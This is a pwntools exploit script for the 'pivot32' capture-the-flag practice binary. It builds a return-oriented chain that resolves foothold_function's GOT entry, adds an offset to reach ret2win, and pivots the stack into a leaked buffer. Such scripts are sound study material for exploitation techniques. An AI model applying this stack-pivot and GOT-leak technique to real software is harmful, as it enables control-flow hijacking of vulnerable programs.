#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

''' Let's get the ret2win offset...
$ readelf -s libpivot32.so | grep foothold_function 
     9: 00000770    43 FUNC    GLOBAL DEFAULT   12 foothold_function
$ readelf -s libpivot32.so | grep ret2win           
    17: 00000967    46 FUNC    GLOBAL DEFAULT   12 ret2win
$ python -c 'print hex(0x00000967 - 0x00000770)'
'0x1f7' <-- ret2win offset
'''
ret2win_offset = 0x1f7
foothold_plt     = 0x080485f0  # $ objdump -D pivot32| grep foothold_function
foothold_got_plt = 0x0804a024  # $ objdump -R pivot32 | grep foothold_function

# gadgets found with gdb's dumprop
pop_eax      = 0x80488c0  # pop eax; ret

def ret2win():
    """ foothold_function() isn't called during normal program flow,
        so we'll have to call it first to populate it's .got.plt entry."""
    global foothold_got_plt, foothold_plt, ret2win_offset, pop_eax
    chain =  p32(foothold_plt)
    chain += p32(pop_eax)
    chain += p32(foothold_got_plt)
    chain += p32(0x080488c4)  # mov eax, [eax] ; ret
    chain += p32(0x08048571)  # pop ebx; ret
    chain += p32(ret2win_offset)
    chain += p32(0x080488c7)  # add eax,ebx; ret
    chain += p32(0x080486a3)  # call eax; add esp,0x10; leave; repz ret
    return chain

def move_esp(pivot):
    """moves stack pointer to pivot address"""
    global pop_eax
    chain =  "A"*44
    chain += p32(pop_eax)
    chain += p32(pivot)
    chain += p32(0x80488c2)  # xchg esp,eax; ret
    return chain

def exploit():
    p = process('./pivot32')
    pivot_addr = int(p.recv().splitlines()[4].split()[11],16)
    p.sendline(ret2win())
    p.sendlineafter('> ',move_esp(pivot_addr))
    print p.recv()

if __name__ == '__main__':
    exploit()
#_EOF